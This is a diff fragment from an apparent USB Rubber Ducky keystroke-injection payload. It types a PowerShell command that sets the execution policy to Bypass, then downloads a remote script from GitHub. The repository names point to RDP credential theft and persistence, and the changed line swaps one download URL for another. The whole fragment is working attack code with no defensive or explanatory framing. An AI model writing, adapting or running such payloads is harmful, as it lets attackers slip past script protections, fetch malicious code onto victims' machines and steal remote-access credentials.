@@ -24,7 +24,7 @@ STRING Set-ExecutionPolicy Bypass -Force
 DELAY 1000
 ENTER
 DELAY 1000
-STRING $ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Tamirmaidani/Rdp_cred-s-presistence/main/RDP_INFULTRETOR.ps1
+STRING $ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/t-code-now/Ducky_Rdp_Infiltrator/main/Ducky_Rdp_Infiltrator.ps1
 DELAY 1000
 ENTER
 DELAY 2000
